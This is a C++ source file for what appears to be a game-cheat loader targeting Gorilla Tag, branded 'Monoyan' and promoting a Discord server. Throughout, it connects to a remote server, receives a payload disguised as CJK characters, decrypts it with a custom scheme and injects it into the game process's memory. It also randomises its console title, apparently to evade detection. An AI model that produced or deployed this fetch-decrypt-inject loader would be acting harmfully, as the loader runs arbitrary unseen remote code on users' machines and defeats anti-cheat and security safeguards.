#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <string>
#include <tlhelp32.h>
#include <thread>
#include <chrono>
#include <vector>
#include <random>
#include <shellapi.h>
#include <intrin.h>
#include "injector.h"

#pragma comment(lib, "ws2_32.lib")

const std::wstring target_proc = L"Gorilla Tag.exe";
const std::string host = "your-server-ip";
const int port = 1337;
const std::string discord = "https://discord.gg/monoyan";

void run_title() {
    const char charset[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&*()";
    while (true) {
        char title[32];
        uint64_t tsc = __rdtsc();
        for (int i = 0; i < 31; ++i) {
            title[i] = charset[(tsc >> (i % 8)) % (sizeof(charset) - 1)];
        }
        title[31] = '\0';
        SetConsoleTitleA(title);
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
}

LRESULT CALLBACK ov_proc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    if (msg == WM_LBUTTONDOWN) ShellExecuteA(NULL, "open", discord.c_str(), NULL, NULL, SW_SHOWNORMAL);
    if (msg == WM_PAINT) {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);
        SetTextColor(hdc, RGB(180, 0, 255));
        SetBkMode(hdc, TRANSPARENT);
        TextOutA(hdc, 5, 5, "Monoyan", 7);
        EndPaint(hwnd, &ps);
    }
    return DefWindowProc(hwnd, msg, wp, lp);
}

void run_ov() {
    WNDCLASSEXA wc = { sizeof(WNDCLASSEXA), 0, ov_proc, 0, 0, GetModuleHandle(NULL), NULL, NULL, NULL, NULL, "monoyan_class", NULL };
    RegisterClassExA(&wc);
    HWND hwnd = CreateWindowExA(WS_EX_TOPMOST | WS_EX_TRANSPARENT | WS_EX_LAYERED, "monoyan_class", "Monoyan", WS_POPUP, 10, 10, 100, 30, NULL, NULL, wc.hInstance, NULL);
    SetLayeredWindowAttributes(hwnd, RGB(0, 0, 0), 0, LWA_COLORKEY);
    ShowWindow(hwnd, SW_SHOW);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

DWORD get_pid(const std::wstring& name) {
    DWORD pid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W entry;
        entry.dwSize = sizeof(entry);
        if (Process32FirstW(snap, &entry)) {
            do {
                if (std::wstring(entry.szExeFile) == name) {
                    pid = entry.th32ProcessID;
                    break;
                }
            } while (Process32NextW(snap, &entry));
        }
        CloseHandle(snap);
    }
    return pid;
}

void run_vm(char* data, int size, const uint8_t* key) {
    uint8_t r = key[0];
    for (int i = 0; i < size; ++i) {
        uint8_t b = (uint8_t)data[i];
        uint8_t next_r = b;
        b = (b >> 4) | (b << 4);
        b = (b >= r) ? (b - r) : (256 + b - r);
        b ^= key[i % 16];
        data[i] = (char)b;
        r = next_r;
    }
}

std::vector<uint8_t> from_script(const std::vector<char>& script) {
    std::vector<uint8_t> out;
    for (size_t i = 0; i < script.size(); ) {
        if ((unsigned char)script[i] >= 0xE0) {
            uint16_t c = ((script[i] & 0x0F) << 12) | ((script[i+1] & 0x3F) << 6) | (script[i+2] & 0x3F);
            out.push_back((uint8_t)(c - 0x4E00));
            i += 3;
        } else i++;
    }
    return out;
}

bool run_stream(DWORD pid, const std::string& ip, int port) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return false;
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) { WSACleanup(); return false; }
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &addr.sin_addr);
    if (connect(s, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(s); WSACleanup(); return false;
    }
    std::vector<char> script;
    char buf[4096];
    int r;
    while ((r = recv(s, buf, sizeof(buf), 0)) > 0) {
        script.insert(script.end(), buf, buf + r);
    }
    closesocket(s);
    WSACleanup();
    std::vector<uint8_t> raw = from_script(script);
    if (raw.size() < 20) return false;
    uint8_t key[16];
    memcpy(key, raw.data(), 16);
    uint32_t total = *(uint32_t*)(raw.data() + 16);
    Injector core(pid);
    uintptr_t remote = core.GetMemory()->Allocate(total);
    char* data = (char*)(raw.data() + 20);
    int sz = (int)(raw.size() - 20);
    run_vm(data, sz, key);
    core.GetMemory()->Write(remote, data, sz);
    return core.InjectFromRemoteMemory(remote, total, "MyMod", "Loader", "Init");
}

int main() {
    std::thread(run_title).detach();
    std::thread(run_ov).detach();
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    system("cls");
    SetConsoleTextAttribute(hOut, 5);
    std::cout << "  __  __                                     " << std::endl;
    std::cout << " |  \\/  | ___  _ __   ___  _   _  __ _ _ __  " << std::endl;
    std::cout << " | |\\/| |/ _ \\| '_ \\ / _ \\| | | |/ _` | '_ \\ " << std::endl;
    std::cout << " | |  | | (_) | | | | (_) | |_| | (_| | | | |" << std::endl;
    std::cout << " |_|  |_|\\___/|_| |_|\\___/ \\__, |\\__,_|_| |_|" << std::endl;
    std::cout << "                           |___/             " << std::endl;
    std::cout << "=============================================" << std::endl;
    SetConsoleTextAttribute(hOut, 13);
    std::cout << "          STAY SHARP. STAY YAN.              " << std::endl;
    SetConsoleTextAttribute(hOut, 5);
    std::cout << "=============================================" << std::endl;
    SetConsoleTextAttribute(hOut, 8);
    uintptr_t k = *(uintptr_t*)0x7FFE0008;
    std::cout << "\n[kernel] sync: 0x" << std::hex << k << std::dec << std::endl;
    std::string name(target_proc.begin(), target_proc.end());
    std::cout << "[status] waiting for " << name << "..." << std::endl;
    DWORD pid = 0;
    while (pid == 0) {
        pid = get_pid(target_proc);
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }
    SetConsoleTextAttribute(hOut, 13);
    std::cout << "[+] found " << name << " (" << pid << ")" << std::endl;
    SetConsoleTextAttribute(hOut, 8);
    std::cout << "[action] streaming from " << host << ":" << port << "..." << std::endl;
    if (run_stream(pid, host, port)) {
        SetConsoleTextAttribute(hOut, 13);
        std::cout << "[+] core synchronized." << std::endl;
        Beep(1000, 150);
    } else {
        SetConsoleTextAttribute(hOut, 12);
        std::cout << "[-] sync failed." << std::endl;
    }
    std::this_thread::sleep_for(std::chrono::seconds(5));
    return 0;
}
